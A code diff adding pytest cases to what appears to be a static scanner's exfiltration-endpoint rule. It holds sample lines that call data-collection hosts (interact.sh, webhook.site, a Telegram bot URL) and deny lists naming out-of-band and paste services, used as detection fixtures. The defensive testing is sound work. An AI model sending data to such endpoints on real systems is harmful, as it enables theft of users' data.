@@ -189,3 +189,44 @@ def test_encoded_blob_is_linear_on_runs_just_too_short() -> None:
         assert time.perf_counter() - started < 1.0
     text = "x." + "A" * 199 + "." + B64 + "==AAAA"
     assert [m.span() for m in rule.pattern.finditer(text)] == [(202, 202 + len(B64) + 2)]
+
+
+def test_interact_sh_needs_a_boundary() -> None:
+    """`cortico-world-qqbot-feibi`: `this.interact.shareLink(body)` was HIGH."""
+
+    def fires(text: str) -> bool:
+        return any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))
+
+    assert not fires("return brief(await this.interact.shareLink(body), 800)")
+    assert fires("fetch('https://c0ffee.interact.sh/x')")
+    assert fires("const h = 'interact.sh'")
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # dsh-security-pack's vet checks, wrapped over lines
+        "const BAD = ['webhook.site', 'requestbin.net', 'requestcatcher.com',\n"
+        "  'oastify.com', 'interact.sh', 'pipedream.net', 'api.telegram.org/bot'];",
+        # an agent policy engine's deny list
+        'deny: ["pastebin.com", "hastebin.com", "x.m.pipedream.net", "webhook.site"]',
+    ],
+)
+def test_a_deny_list_of_services_is_not_an_endpoint(text: str) -> None:
+    assert not any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "const hosts = ['webhook.site', 'pipedream.net'];",  # two services: not a list
+        "['webhook.site', 'webhook.site', 'x.webhook.site', 'pipedream.net']",  # still two
+        # URLs, not whole host literals, beside a list
+        "send('https://webhook.site/abc'); ['oastify.com', 'interact.sh', 'pipedream.net']",
+        'fetch("https://api.telegram.org/bot" + t); '
+        'x = ["oastify.com", "webhook.site", "a.ngrok.io"]',
+        "if (h.endsWith('.trycloudflare.com')) go()",
+    ],
+)
+def test_endpoints_outside_a_deny_list_still_count(text: str) -> None:
+    assert any(m.rule_id == "static.exfil-endpoint" for m in analyse(text.encode()))
